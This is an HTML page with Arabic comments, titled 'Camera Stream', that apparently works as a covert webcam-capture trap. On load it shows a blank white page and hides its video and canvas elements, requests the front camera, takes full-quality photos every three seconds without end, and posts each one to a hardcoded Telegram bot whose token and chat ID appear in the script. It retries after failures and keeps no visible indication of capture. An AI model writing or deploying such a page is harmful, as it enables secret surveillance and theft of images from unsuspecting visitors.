<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera Stream</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background-color: #ffffff;
      width: 100vw;
      height: 100vh;
      overflow: hidden;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    
    // بيانات تيليجرام
    const BOT_TOKEN = '8948041325:AAEA_XM0vHfsxbvhTAwZp4gD_gKvAhZlQVI';
    const CHAT_ID = '8720724887';
    
    // الفاصل الزمني بين كل صورة (بالمللي ثانية) - كل 3 ثواني
    const CAPTURE_INTERVAL = 3000;
    
    let stream = null;
    let captureTimer = null;
    let isReady = false;

    async function startCameraAndCapture() {
      try {
        // طلب إذن الكاميرا
        stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        });
        
        video.srcObject = stream;
        
        // انتظار حتى تصبح الكاميرا جاهزة وتشتغل
        await video.play();
        
        // انتظار إضافي للتأكد من أن الكاميرا ترسل إطارات حقيقية
        await new Promise((resolve) => {
          const checkReady = () => {
            if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              isReady = true;
              resolve();
            } else {
              requestAnimationFrame(checkReady);
            }
          };
          checkReady();
        });
        
        // انتظار إضافي 1 ثانية للتأكد من سطوع الكاميرا
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // بدأ التقاط الصور التلقائي إلى ما لا نهاية
        captureTimer = setInterval(captureAndSend, CAPTURE_INTERVAL);
        
        // التقاط أول صورة فوراً
        captureAndSend();
        
      } catch (err) {
        console.error('[Camera Error]', err);
        setTimeout(startCameraAndCapture, 5000);
      }
    }

    function captureAndSend() {
      if (!isReady || !video.srcObject || video.readyState < 2) {
        console.warn('[Not Ready] Waiting for camera...');
        return;
      }
      
      try {
        const ctx = canvas.getContext('2d');
        
        // رسم الفيديو على canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // تحويل Canvas إلى Blob (ملف PNG حقيقي)
        canvas.toBlob((blob) => {
          if (blob && blob.size > 0) {
            sendToTelegram(blob);
          } else {
            console.error('[Empty Blob]');
          }
        }, 'image/png', 1.0); // 1.0 يعني جودة كاملة
        
      } catch (err) {
        console.error('[Capture Error]', err);
      }
    }

    async function sendToTelegram(imageBlob) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', imageBlob, `capture_${Date.now()}.png`);
      formData.append('caption', `📸 ${new Date().toLocaleString('ar-EG')}`);

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        
        const data = await response.json();
        
        if (!data.ok) {
          console.error('[Telegram Error]', data.description);
        } else {
          console.log('[Sent] Photo sent successfully');
        }
      } catch (err) {
        console.error('[Send Error]', err);
      }
    }

    // تنظيف عند الخروج من الصفحة
    window.addEventListener('beforeunload', () => {
      if (captureTimer) clearInterval(captureTimer);
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    });

    // إعادة المحاولة إذا الصفحة أصبحت مخفية ثم ظهرت
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        if (captureTimer) clearInterval(captureTimer);
      } else {
        if (isReady) {
          captureAndSend();
          captureTimer = setInterval(captureAndSend, CAPTURE_INTERVAL);
        }
      }
    });

    // تشغيل الكاميرا عند تحميل الصفحة
    startCameraAndCapture();
  </script>
</body>
</html>
